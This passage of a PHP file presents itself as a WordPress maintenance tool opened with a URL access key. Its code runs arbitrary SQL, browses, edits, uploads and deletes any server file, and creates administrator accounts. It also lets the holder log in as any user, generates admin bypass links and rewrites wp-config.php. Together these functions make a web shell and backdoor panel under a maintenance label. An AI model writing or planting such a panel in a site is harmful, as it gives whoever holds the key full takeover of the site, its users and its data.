                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error loading file');
                });
        }
        
        // Edit file function
        function editFile(filePath) {
            const url = new URL(window.location.href);
            url.searchParams.set('key', '<?php echo ACCESS_KEY; ?>');
            url.searchParams.set('action', 'ajax');
            url.searchParams.set('operation', 'edit_file');
            url.searchParams.set('file', filePath);
            
            fetch(url.toString())
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('lightboxTitle').textContent = 'Editing: ' + data.filename;
                        document.getElementById('lightboxBody').innerHTML = data.content;
                        document.getElementById('lightboxActions').innerHTML = data.actions;
                        openLightbox();
                    } else {
                        console.log('Debug info:', data.debug);
                        alert('Error: ' + data.message + (data.debug ? '\nCheck console for debug info' : ''));
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error loading file for editing');
                });
        }
        
        // Save file function
        function saveFile(filePath) {
            const content = document.getElementById('fileContentEditor').value;
            const formData = new FormData();
            formData.append('file_path', filePath);
            formData.append('file_content', content);
            formData.append('save_file', '1');
            
            fetch('?key=<?php echo ACCESS_KEY; ?>&action=ajax&operation=save_file', {
                method: 'POST',
                body: formData
            })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('File saved successfully!');
                        closeLightbox();
                        location.reload(); // Refresh to show updated file
                    } else {
                        alert('Error saving file: ' + data.message);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error saving file');
                });
        }
    </script>
</body>
</html>

<?php

function showSiteInfo() {
    global $wpdb;
    ?>
    <div class="content">
        <h2>Site Information</h2>
        <table>
            <tr><th>Site URL</th><td><?php echo home_url(); ?></td></tr>
            <tr><th>WordPress Version</th><td><?php echo get_bloginfo('version'); ?></td></tr>
            <tr><th>PHP Version</th><td><?php echo phpversion(); ?></td></tr>
            <tr><th>MySQL Version</th><td><?php echo $wpdb->db_version(); ?></td></tr>
            <tr><th>Active Theme</th><td><?php echo wp_get_theme()->get('Name'); ?></td></tr>
            <tr><th>WordPress Path</th><td><?php echo ABSPATH; ?></td></tr>
            <tr><th>Database Name</th><td><?php echo DB_NAME; ?></td></tr>
            <tr><th>Database Host</th><td><?php echo DB_HOST; ?></td></tr>
            <tr><th>Table Prefix</th><td><?php echo $wpdb->prefix; ?></td></tr>
        </table>
    </div>
    <?php
}

function handleUsers() {
    if (isset($_POST['create_user'])) {
        $username = sanitize_user($_POST['username']);
        $email = sanitize_email($_POST['email']);
        $password = $_POST['password'];
        $role = $_POST['role'];
        
        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role($role);
                echo '<div class="success">User created successfully!</div>';
            } else {
                echo '<div class="error">Error creating user: ' . $user_id->get_error_message() . '</div>';
            }
        } else {
            echo '<div class="error">Username or email already exists!</div>';
        }
    }
    
    if (isset($_POST['delete_user'])) {
        $user_id = intval($_POST['user_id']);
        if (wp_delete_user($user_id)) {
            echo '<div class="success">User deleted successfully!</div>';
        } else {
            echo '<div class="error">Error deleting user!</div>';
        }
    }
    
    ?>
    <div class="content">
        <h2>User Management</h2>
        
        <h3>Create New User</h3>
        <form method="post">
            <div class="form-group">
                <label>Username:</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Email:</label>
                <input type="email" name="email" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required>
            </div>
            <div class="form-group">
                <label>Role:</label>
                <select name="role">
                    <option value="administrator">Administrator</option>
                    <option value="editor">Editor</option>
                    <option value="author">Author</option>
                    <option value="contributor">Contributor</option>
                    <option value="subscriber">Subscriber</option>
                </select>
            </div>
            <button type="submit" name="create_user" class="btn">Create User</button>
        </form>
        
        <h3>Existing Users</h3>
        <table>
            <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>Actions</th></tr>
            <?php
            $users = get_users();
            foreach ($users as $user) {
                echo '<tr>';
                echo '<td>' . $user->ID . '</td>';
                echo '<td>' . $user->user_login . '</td>';
                echo '<td>' . $user->user_email . '</td>';
                echo '<td>' . implode(', ', $user->roles) . '</td>';
                echo '<td>';
                echo '<form method="post" style="display:inline;">';
                echo '<input type="hidden" name="user_id" value="' . $user->ID . '">';
                echo '<button type="submit" name="delete_user" class="btn" onclick="return confirm(\'Are you sure?\')">Delete</button>';
                echo '</form>';
                echo '</td>';
                echo '</tr>';
            }
            ?>
        </table>
    </div>
    <?php
}

function handleDatabase() {
    global $wpdb;
    
    if (isset($_POST['execute_query'])) {
        $query = $_POST['query'];
        $result = $wpdb->query($query);
        
        if ($result !== false) {
            echo '<div class="success">Query executed successfully. Affected rows: ' . $result . '</div>';
        } else {
            echo '<div class="error">Query failed: ' . $wpdb->last_error . '</div>';
        }
    }
    
    ?>
    <div class="content">
        <h2>Database Access</h2>
        
        <h3>Execute Query</h3>
        <form method="post">
            <div class="form-group">
                <label>SQL Query:</label>
                <textarea name="query" rows="5" placeholder="SELECT * FROM wp_users LIMIT 10"></textarea>
            </div>
            <button type="submit" name="execute_query" class="btn">Execute Query</button>
        </form>
        
        <h3>Database Tables</h3>
        <table>
            <tr><th>Table Name</th><th>Rows</th></tr>
            <?php
            $tables = $wpdb->get_results("SHOW TABLES", ARRAY_N);
            foreach ($tables as $table) {
                $table_name = $table[0];
                $count = $wpdb->get_var("SELECT COUNT(*) FROM $table_name");
                echo '<tr><td>' . $table_name . '</td><td>' . $count . '</td></tr>';
            }
            ?>
        </table>
    </div>
    <?php
}

function handleFiles() {
    $current_dir = isset($_GET['dir']) ? $_GET['dir'] : ABSPATH;
    $current_dir = realpath($current_dir);
    
    // Handle file editing
    if (isset($_POST['save_file'])) {
        $file_path = $_POST['file_path'];
        $file_content = $_POST['file_content'];
        
        if (file_put_contents($file_path, $file_content) !== false) {
            echo '<div class="success">File saved successfully!</div>';
        } else {
            echo '<div class="error">Error saving file!</div>';
        }
    }
    
    // Download logic moved to top of file before HTML output
    
    if (isset($_POST['upload_file'])) {
        $target_dir = $current_dir . '/';
        $target_file = $target_dir . basename($_FILES["file"]["name"]);
        
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
            echo '<div class="success">File uploaded successfully!</div>';
        } else {
            echo '<div class="error">Error uploading file!</div>';
        }
    }
    
    if (isset($_POST['delete_file'])) {
        $file_to_delete = $_POST['file_path'];
        if (unlink($file_to_delete)) {
            echo '<div class="success">File deleted successfully!</div>';
        } else {
            echo '<div class="error">Error deleting file!</div>';
        }
    }
    
    // Check if viewing/editing a specific file
    $view_file = isset($_GET['view']) ? $_GET['view'] : null;
    $edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
    
    // Helper functions moved to top of file before AJAX handling
    
    ?>
    <div class="content">
        <h2>File Manager</h2>
        <p><strong>Current Directory:</strong> <?php echo $current_dir; ?></p>
        
        <h3>Upload File</h3>
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label>Select File:</label>
                <input type="file" name="file">
            </div>
            <button type="submit" name="upload_file" class="btn">Upload</button>
        </form>
        
        <h3>Directory Contents</h3>
        <div class="file-list">
            <table>
                <tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
                <?php
                if ($current_dir !== ABSPATH) {
                    $parent_dir = dirname($current_dir);
                    echo '<tr><td><a href="?key=' . ACCESS_KEY . '&action=files&dir=' . urlencode($parent_dir) . '">../</a></td><td>Directory</td><td>-</td><td>-</td><td>-</td></tr>';
                }
                
                $files = scandir($current_dir);
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    
                    $file_path = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file;
                    $is_dir = is_dir($file_path);
                    $size = $is_dir ? '-' : filesize($file_path);
                    $modified = date('Y-m-d H:i:s', filemtime($file_path));
                    
                    echo '<tr>';
                    if ($is_dir) {
                        echo '<td><a href="?key=' . ACCESS_KEY . '&action=files&dir=' . urlencode($file_path) . '">' . $file . '/</a></td>';
                        echo '<td>Directory</td>';
                    } else {
                        echo '<td>' . $file . '</td>';
                        echo '<td>File</td>';
                    }
                    echo '<td>' . ($size === '-' ? '-' : number_format($size) . ' bytes') . '</td>';
                    echo '<td>' . $modified . '</td>';
                    echo '<td class="file-actions">';
                    if ($is_dir) {
                        echo '<a href="?key=' . ACCESS_KEY . '&action=files&dir=' . urlencode($file_path) . '" class="btn btn-primary" title="Open Directory"><i class="fas fa-folder-open"></i></a>';
                    } else {
                        // View button for all files
                        echo '<button onclick="viewFile(\'' . addslashes($file_path) . '\')" class="btn btn-info" title="View File"><i class="fas fa-eye"></i></button> ';
                        
                        // Edit button for editable files
                        if (isEditableFile($file_path)) {
                            echo '<button onclick="editFile(\'' . addslashes($file_path) . '\')" class="btn btn-warning" title="Edit File"><i class="fas fa-edit"></i></button> ';
                        }
                        
                        // Download button
                        echo '<a href="?key=' . ACCESS_KEY . '&action=files&download=' . urlencode($file_path) . '" class="btn btn-success" title="Download File"><i class="fas fa-download"></i></a> ';
                        
                        // Delete button
                        echo '<form method="post" style="display:inline;">';
                        echo '<input type="hidden" name="file_path" value="' . $file_path . '">';
                        echo '<button type="submit" name="delete_file" class="btn btn-danger" onclick="return confirm(\'Are you sure?\');" title="Delete File"><i class="fas fa-trash"></i></button>';
                        echo '</form>';
                    }
                    echo '</td>';
                    echo '</tr>';
                }
                ?>
            </table>
        </div>
        
        <!-- Lightbox Modal -->
        <div id="fileLightbox" class="lightbox">
            <div class="lightbox-content">
                <div class="lightbox-header">
                    <h3 id="lightboxTitle">File Viewer</h3>
                    <button class="lightbox-close" onclick="closeLightbox()">&times;</button>
                </div>
                <div class="lightbox-body" id="lightboxBody">
                    <!-- Content will be loaded here -->
                </div>
                <div class="lightbox-actions" id="lightboxActions">
                    <!-- Actions will be loaded here -->
                </div>
            </div>
        </div>
        
    </div>
    <?php
}

function showPlugins() {
    if (isset($_POST['activate_plugin'])) {
        $plugin = $_POST['plugin'];
        activate_plugin($plugin);
        echo '<div class="success">Plugin activated!</div>';
    }
    
    if (isset($_POST['deactivate_plugin'])) {
        $plugin = $_POST['plugin'];
        deactivate_plugins($plugin);
        echo '<div class="success">Plugin deactivated!</div>';
    }
    
    ?>
    <div class="content">
        <h2>Plugin Management</h2>
        <table>
            <tr><th>Plugin Name</th><th>Version</th><th>Status</th><th>Actions</th></tr>
            <?php
            $plugins = get_plugins();
            foreach ($plugins as $plugin_file => $plugin_data) {
                $is_active = is_plugin_active($plugin_file);
                echo '<tr>';
                echo '<td>' . $plugin_data['Name'] . '</td>';
                echo '<td>' . $plugin_data['Version'] . '</td>';
                echo '<td>' . ($is_active ? 'Active' : 'Inactive') . '</td>';
                echo '<td>';
                echo '<form method="post" style="display:inline;">';
                echo '<input type="hidden" name="plugin" value="' . $plugin_file . '">';
                if ($is_active) {
                    echo '<button type="submit" name="deactivate_plugin" class="btn">Deactivate</button>';
                } else {
                    echo '<button type="submit" name="activate_plugin" class="btn">Activate</button>';
                }
                echo '</form>';
                echo '</td>';
                echo '</tr>';
            }
            ?>
        </table>
    </div>
    <?php
}

function showThemes() {
    $themes = wp_get_themes();
    $current_theme = wp_get_theme();
    
    ?>
    <div class="content">
        <h2>Theme Management</h2>
        <table>
            <tr><th>Theme Name</th><th>Version</th><th>Status</th></tr>
            <?php
            foreach ($themes as $theme) {
                $is_active = ($theme->get_stylesheet() === $current_theme->get_stylesheet());
                echo '<tr>';
                echo '<td>' . $theme->get('Name') . '</td>';
                echo '<td>' . $theme->get('Version') . '</td>';
                echo '<td>' . ($is_active ? 'Active' : 'Inactive') . '</td>';
                echo '</tr>';
            }
            ?>
        </table>
    </div>
    <?php
}

function handleQuickLogin() {
    global $login_message, $login_redirect;
    
    if (isset($_POST['direct_admin_access'])) {
        // Create a session-based admin access
        $nonce = wp_create_nonce('direct_admin_access_' . time());
        $admin_url = add_query_arg([
            'maintenance_access' => $nonce,
            'key' => ACCESS_KEY
        ], home_url() . '/' . basename(__FILE__));
        
        // Store the nonce temporarily
        set_transient('maintenance_access_' . $nonce, true, 3600); // 1 hour
        
        echo '<script>setTimeout(function() { window.open("' . $admin_url . '", "_blank"); }, 1000);</script>';
        echo '<div class="success">Direct admin access link generated! Opening in new tab...</div>';
    }
    
    ?>
    <div class="content">
        <h2>Quick Login Options</h2>
        
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0;">
            
            <!-- Login as Existing User -->
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3>Login as Existing User</h3>
                <p>Select any existing user to login as them instantly.</p>
                
                <form method="post">
                    <div class="form-group">
                        <label>Select User:</label>
                        <select name="user_id" required>
                            <option value="">Choose a user...</option>
                            <?php
                            $users = get_users();
                            foreach ($users as $user) {
                                $roles = implode(', ', $user->roles);
                                echo '<option value="' . $user->ID . '">' . $user->user_login . ' (' . $roles . ')</option>';
                            }
                            ?>
                        </select>
                    </div>
                    <button type="submit" name="login_as_user" class="btn">Login as Selected User</button>
                </form>
            </div>
            
            <!-- Create Temporary Admin -->
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3>Create Temporary Admin</h3>
                <p>Creates a new admin user with random credentials and logs you in instantly.</p>
                
                <form method="post">
                    <button type="submit" name="create_temp_admin" class="btn">Create & Login as Temp Admin</button>
                </form>
                
                <p style="font-size: 12px; color: #999; margin-top: 10px;">
                    <em>Note: Remember to delete temporary users after use.</em>
                </p>
            </div>
            
            <!-- Direct Admin Access -->
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3>Direct Admin Access</h3>
                <p>Generate a special link for direct WordPress admin access.</p>
                
                <form method="post">
                    <button type="submit" name="direct_admin_access" class="btn">Generate Admin Access Link</button>
                </form>
                
                <p style="font-size: 12px; color: #999; margin-top: 10px;">
                    <em>Link expires in 1 hour for security.</em>
                </p>
            </div>
            
        </div>
        
        <div style="background: #2A2A2A; padding: 15px; border-radius: 3px; border-left: 4px solid var(--accent-color); margin-top: 20px;">
            <h3>Current Login Status</h3>
            <?php
            $current_user = wp_get_current_user();
            if ($current_user->ID) {
                echo '<p><strong>Currently logged in as:</strong> ' . $current_user->user_login . ' (' . implode(', ', $current_user->roles) . ')</p>';
                echo '<p><a href="' . admin_url() . '" target="_blank" style="color: #ff7e3a;">Open WordPress Admin</a></p>';
            } else {
                echo '<p>Not currently logged in to WordPress.</p>';
            }
            ?>
        </div>
        
        <div style="background: #2A2A2A; padding: 15px; border-radius: 3px; border: 1px solid #333333; margin-top: 20px;">
            <h3>Quick Actions</h3>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <a href="<?php echo admin_url(); ?>" target="_blank" class="btn">WordPress Admin</a>
                <a href="<?php echo home_url(); ?>" target="_blank" class="btn">View Site</a>
                <a href="<?php echo wp_login_url(); ?>" target="_blank" class="btn">Login Page</a>
            </div>
        </div>
        
        <div style="background: #2A2A2A; padding: 15px; border-radius: 3px; border: 1px solid #333333; margin-top: 20px;">
            <h3>Emergency Access Instructions</h3>
            <p style="font-size: 14px; line-height: 1.5;">
                <strong>If you get locked out:</strong><br>
                1. Use "Create Temporary Admin" - most reliable method<br>
                2. Use "Direct Admin Access" - generates bypass link<br>
                3. Use "Login as Existing User" - if you know existing users<br>
                4. Check the Users tab to see all available accounts
            </p>
        </div>
    </div>
    <?php
}

function handleDebug() {
    $wp_config_path = ABSPATH . 'wp-config.php';
    $config_content = '';
    $config_writable = false;
    $debug_settings = [];
    
    // Check if wp-config.php is readable and writable
    if (file_exists($wp_config_path)) {
        $config_content = file_get_contents($wp_config_path);
        $config_writable = is_writable($wp_config_path);
        
        // Parse current debug settings
        $debug_settings = [
            'WP_DEBUG' => [
                'current' => defined('WP_DEBUG') ? (WP_DEBUG ? 'true' : 'false') : 'undefined',
                'description' => 'Enable/disable WordPress debug mode'
            ],
            'WP_DEBUG_LOG' => [
                'current' => defined('WP_DEBUG_LOG') ? (WP_DEBUG_LOG ? 'true' : 'false') : 'undefined',
                'description' => 'Enable debug logging to /wp-content/debug.log'
            ],
            'WP_DEBUG_DISPLAY' => [
                'current' => defined('WP_DEBUG_DISPLAY') ? (WP_DEBUG_DISPLAY ? 'true' : 'false') : 'undefined',
                'description' => 'Display debug messages on screen'
            ],
            'SCRIPT_DEBUG' => [
                'current' => defined('SCRIPT_DEBUG') ? (SCRIPT_DEBUG ? 'true' : 'false') : 'undefined',
                'description' => 'Use unminified versions of CSS and JS files'
            ],
            'SAVEQUERIES' => [
                'current' => defined('SAVEQUERIES') ? (SAVEQUERIES ? 'true' : 'false') : 'undefined',
                'description' => 'Save database queries for analysis'
            ]
        ];
    }
    
    // Handle form submission
    if (isset($_POST['update_debug_settings']) && $config_writable) {
        $new_config = $config_content;
        
        foreach ($debug_settings as $setting => $info) {
            $new_value = isset($_POST[$setting]) ? $_POST[$setting] : 'false';
            $define_pattern = "/define\s*\(\s*['\"]" . $setting . "['\"]\s*,\s*[^)]+\s*\)\s*;/";
            $new_define = "define('" . $setting . "', " . $new_value . ");"; 
            
            if (preg_match($define_pattern, $new_config)) {
                // Replace existing define
                $new_config = preg_replace($define_pattern, $new_define, $new_config);
            } else {
                // Add new define before the "That's all" comment or at the end
                $insert_position = strpos($new_config, "/* That's all, stop editing!");
                if ($insert_position === false) {
                    $insert_position = strpos($new_config, "?>");
                }
                if ($insert_position !== false) {
                    $new_config = substr_replace($new_config, $new_define . "\n\n", $insert_position, 0);
                } else {
                    $new_config .= "\n" . $new_define;
                }
            }
        }
        
        // Write the updated config
        if (file_put_contents($wp_config_path, $new_config)) {
            echo '<div class="success">Debug settings updated successfully! Please refresh the page to see current values.</div>';
            echo '<script>setTimeout(function() { location.reload(); }, 2000);</script>';
        } else {
            echo '<div class="error">Failed to update wp-config.php. Check file permissions.</div>';
        }
    }
    
    ?>
    <div class="content">
        <h2>WordPress Debug Settings</h2>
        
        <?php if (!file_exists($wp_config_path)): ?>
            <div class="error">
                <strong>Error:</strong> wp-config.php file not found at: <?php echo $wp_config_path; ?>
            </div>
        <?php elseif (!$config_writable): ?>
            <div class="error">
                <strong>Warning:</strong> wp-config.php is not writable. You'll need to manually edit the file or change permissions.
                <br><strong>File location:</strong> <?php echo $wp_config_path; ?>
            </div>
        <?php endif; ?>
        
        <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333; margin-bottom: 20px;">
            <h3>Current Debug Status</h3>
            <table>
                <tr><th>Setting</th><th>Current Value</th><th>Description</th></tr>
                <?php foreach ($debug_settings as $setting => $info): ?>
                    <tr>
                        <td><code><?php echo $setting; ?></code></td>
                        <td>
                            <span style="color: <?php echo $info['current'] === 'true' ? '#4CAF50' : ($info['current'] === 'false' ? '#f44336' : '#ff9800'); ?>">
                                <?php echo strtoupper($info['current']); ?>
                            </span>
                        </td>
                        <td><?php echo $info['description']; ?></td>
                    </tr>
                <?php endforeach; ?>
            </table>
        </div>
        
        <?php if ($config_writable): ?>
            <form method="post" style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3>Update Debug Settings</h3>
                <p style="color: #999; margin-bottom: 20px;">Configure WordPress debug settings. Changes will be written to wp-config.php.</p>
                
                <?php foreach ($debug_settings as $setting => $info): ?>
                    <div class="form-group" style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; font-weight: bold;"><?php echo $setting; ?></label>
                        <p style="font-size: 12px; color: #999; margin-bottom: 8px;"><?php echo $info['description']; ?></p>
                        <select name="<?php echo $setting; ?>" style="width: 200px; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px;">
                            <option value="false" <?php echo ($info['current'] === 'false') ? 'selected' : ''; ?>>false (Disabled)</option>
                            <option value="true" <?php echo ($info['current'] === 'true') ? 'selected' : ''; ?>>true (Enabled)</option>
                        </select>
                    </div>
                <?php endforeach; ?>
                
                <button type="submit" name="update_debug_settings" class="btn" style="margin-top: 15px;">Update Debug Settings</button>
            </form>
        <?php endif; ?>
        
        <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333; margin-top: 20px;">
            <h3>Debug Information</h3>
            <table>
                <tr><th>Item</th><th>Value</th></tr>
                <tr><td>Debug Log File</td><td><?php echo WP_CONTENT_DIR . '/debug.log'; ?></td></tr>
                <tr><td>Log File Exists</td><td><?php echo file_exists(WP_CONTENT_DIR . '/debug.log') ? 'Yes' : 'No'; ?></td></tr>
                <tr><td>Log File Size</td><td>
                    <?php 
                    $log_file = WP_CONTENT_DIR . '/debug.log';
                    if (file_exists($log_file)) {
                        $size = filesize($log_file);
                        echo $size > 0 ? size_format($size) : '0 bytes';
                    } else {
                        echo 'N/A';
                    }
                    ?>
                </td></tr>
                <tr><td>Error Reporting Level</td><td><?php echo error_reporting(); ?></td></tr>
                <tr><td>Display Errors</td><td><?php echo ini_get('display_errors') ? 'On' : 'Off'; ?></td></tr>
                <tr><td>Log Errors</td><td><?php echo ini_get('log_errors') ? 'On' : 'Off'; ?></td></tr>
            </table>
        </div>
        
        <?php if (file_exists(WP_CONTENT_DIR . '/debug.log')): ?>
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333; margin-top: 20px;">
                <h3>Recent Debug Log Entries</h3>
                <div style="background: #1a1a1a; padding: 15px; border-radius: 3px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; white-space: pre-wrap;">
                    <?php
                    $log_content = file_get_contents(WP_CONTENT_DIR . '/debug.log');
                    $log_lines = explode("\n", $log_content);
                    $recent_lines = array_slice($log_lines, -50); // Show last 50 lines
                    echo htmlspecialchars(implode("\n", $recent_lines));
                    ?>
                </div>
                <p style="margin-top: 10px; font-size: 12px; color: #999;">
                    Showing last 50 lines. Full log: <?php echo WP_CONTENT_DIR . '/debug.log'; ?>
                </p>
            </div>
        <?php endif; ?>
        
        <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border-left: 4px solid var(--accent-color); margin-top: 20px;">
            <h3>Debug Settings Guide</h3>
            <ul style="line-height: 1.6;">
                <li><strong>WP_DEBUG:</strong> Master switch for debug mode. Must be true to enable other debug features.</li>
                <li><strong>WP_DEBUG_LOG:</strong> Saves debug messages to /wp-content/debug.log file.</li>
                <li><strong>WP_DEBUG_DISPLAY:</strong> Shows debug messages on screen. Recommended: false for production.</li>
                <li><strong>SCRIPT_DEBUG:</strong> Uses unminified CSS/JS files for easier debugging.</li>
                <li><strong>SAVEQUERIES:</strong> Saves all database queries for performance analysis.</li>
            </ul>
            
            <h4 style="margin-top: 20px;">Recommended Settings:</h4>
            <p><strong>Development:</strong> All enabled (true)</p>
            <p><strong>Production:</strong> WP_DEBUG=true, WP_DEBUG_LOG=true, WP_DEBUG_DISPLAY=false</p>
        </div>
    </div>
    <?php
}

function handleMaintenanceModes() {
    // Handle form submissions
    $message = '';
    $developer_email = get_option('maintenance_tool_developer_email', 'contact@yasirshabbir.com');
    
    // Handle social contact settings update
    if (isset($_POST['update_social_contacts'])) {
        $email = sanitize_email($_POST['developer_email']);
        $phone = sanitize_text_field($_POST['developer_phone']);
        $whatsapp = sanitize_text_field($_POST['developer_whatsapp']);
        $skype = sanitize_text_field($_POST['developer_skype']);
        
        update_option('maintenance_tool_developer_email', $email);
        update_option('maintenance_tool_developer_phone', $phone);
        update_option('maintenance_tool_developer_whatsapp', $whatsapp);
        update_option('maintenance_tool_developer_skype', $skype);
        
        $developer_email = $email;
        $message = '<div class="success">Social contact settings updated successfully!</div>';
    }
    
    // Handle mode activation
    if (isset($_POST['activate_mode'])) {
        $mode = sanitize_text_field($_POST['mode']);
        $custom_message = wp_kses_post($_POST['custom_message'] ?? '');
        $custom_title = sanitize_text_field($_POST['custom_title'] ?? '');
        $custom_css = wp_strip_all_tags($_POST['custom_css'] ?? '');
        $show_social_contacts = isset($_POST['show_social_contacts']) ? 1 : 0;
        
        // Check if frontend file exists
        $frontend_file = ABSPATH . 'wp-content/mu-plugins/maintenance-tool-frontend.php';
        if (!file_exists($frontend_file)) {
            $message = '<div class="error"><span style="color: var(--primary-text);"><i class="fas fa-exclamation-triangle"></i> Frontend file is missing! Please download and install the frontend file first.</span> <a href="#" onclick="showFrontendInstructions(); return false;" style="color: var(--accent-color); text-decoration: underline;"><i class="fas fa-clipboard-list"></i> Click here for instructions</a></div>';
        } else {
            // Save mode settings
            update_option('maintenance_tool_active_mode', $mode);
            update_option('maintenance_tool_custom_message', $custom_message);
            update_option('maintenance_tool_custom_title', $custom_title);
            update_option('maintenance_tool_custom_css', $custom_css);
            update_option('maintenance_tool_show_social_contacts', $show_social_contacts);
            
            $message = '<div class="success">Maintenance mode "' . ucfirst($mode) . '" activated successfully!</div>';
        }
    }
    
    // Handle mode deactivation
    if (isset($_POST['deactivate_mode'])) {
        delete_option('maintenance_tool_active_mode');
        $message = '<div class="success">Maintenance mode deactivated successfully!</div>';
    }
    

    
    $current_mode = get_option('maintenance_tool_active_mode', '');
    $custom_message = get_option('maintenance_tool_custom_message', '');
    $custom_title = get_option('maintenance_tool_custom_title', '');
    $custom_css = get_option('maintenance_tool_custom_css', '');
    $show_social_contacts = get_option('maintenance_tool_show_social_contacts', 1);
    
    // Get social contact settings
    $developer_phone = get_option('maintenance_tool_developer_phone', '');
    $developer_whatsapp = get_option('maintenance_tool_developer_whatsapp', '');
    $developer_skype = get_option('maintenance_tool_developer_skype', '');
    
    ?>
    <div class="content">
        <h2>Maintenance Modes</h2>
        
        <?php echo $message; ?>
        
        <?php if ($current_mode): ?>
            <div class="success" style="margin-bottom: 20px;">
                <strong>Active Mode:</strong> <?php echo ucfirst($current_mode); ?> Mode
                <form method="post" style="display: inline; margin-left: 15px;">
                    <button type="submit" name="deactivate_mode" class="btn btn-danger" onclick="return confirm('Are you sure you want to deactivate maintenance mode?')">Deactivate Mode</button>
                </form>
            </div>
        <?php endif; ?>
        
        <!-- Social Contact Settings -->
        <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333; margin-bottom: 20px;">
            <h3>Social Contact Settings</h3>
            <form method="post">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 20px;">
                    <div class="form-group">
                        <label>Email:</label>
                        <input type="email" name="developer_email" value="<?php echo esc_attr($developer_email); ?>" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px;">
                    </div>
                    <div class="form-group">
                        <label>Phone:</label>
                        <input type="text" name="developer_phone" value="<?php echo esc_attr($developer_phone); ?>" placeholder="+1234567890" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px;">
                    </div>
                    <div class="form-group">
                        <label>WhatsApp:</label>
                        <input type="text" name="developer_whatsapp" value="<?php echo esc_attr($developer_whatsapp); ?>" placeholder="+1234567890" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px;">
                    </div>
                    <div class="form-group">
                        <label>Skype:</label>
                        <input type="text" name="developer_skype" value="<?php echo esc_attr($developer_skype); ?>" placeholder="your.skype.username" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px;">
                    </div>
                </div>
                <button type="submit" name="update_social_contacts" class="btn btn-primary">Update Contact Settings</button>
            </form>
        </div>
        
        <!-- Mode Selection -->
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; margin-bottom: 30px;">
            
            <!-- Maintenance Mode -->
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3 style="color: #ff9800;">🔧 Maintenance Mode</h3>
                <p>Display a maintenance message while you work on the site. Includes noindex meta tag to prevent search engine indexing.</p>
                <form method="post">
                    <input type="hidden" name="mode" value="maintenance">
                    <div class="form-group">
                        <label>Custom Title:</label>
                        <input type="text" name="custom_title" value="<?php echo $current_mode === 'maintenance' ? esc_attr($custom_title) : 'Site Under Maintenance'; ?>" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; margin-bottom: 10px;">
                    </div>
                    <div class="form-group">
                        <label>Custom Message:</label>
                        <textarea name="custom_message" rows="3" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; margin-bottom: 10px;"><?php echo $current_mode === 'maintenance' ? esc_textarea($custom_message) : 'We are currently performing scheduled maintenance. Please check back soon.'; ?></textarea>
                    </div>

                    <button type="submit" name="activate_mode" class="btn btn-warning">Activate Maintenance Mode</button>
                </form>
            </div>
            
            <!-- Coming Soon Mode -->
            <div style="background: #2A2A2A; padding: 20px; border-radius: 3px; border: 1px solid #333333;">
                <h3 style="color: #4CAF50;">🚀 Coming Soon Mode</h3>
                <p>Show a coming soon page for new websites. Includes noindex meta tag and email collection form.</p>
                <form method="post">
                    <input type="hidden" name="mode" value="coming_soon">
                    <div class="form-group">
                        <label>Custom Title:</label>
                        <input type="text" name="custom_title" value="<?php echo $current_mode === 'coming_soon' ? esc_attr($custom_title) : 'Coming Soon'; ?>" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; margin-bottom: 10px;">
                    </div>
                    <div class="form-group">
                        <label>Custom Message:</label>
                        <textarea name="custom_message" rows="3" style="width: 100%; padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 3px; margin-bottom: 10px;"><?php echo $current_mode === 'coming_soon' ? esc_textarea($custom_message) : 'Something amazing is coming soon! Stay tuned for updates.'; ?></textarea>
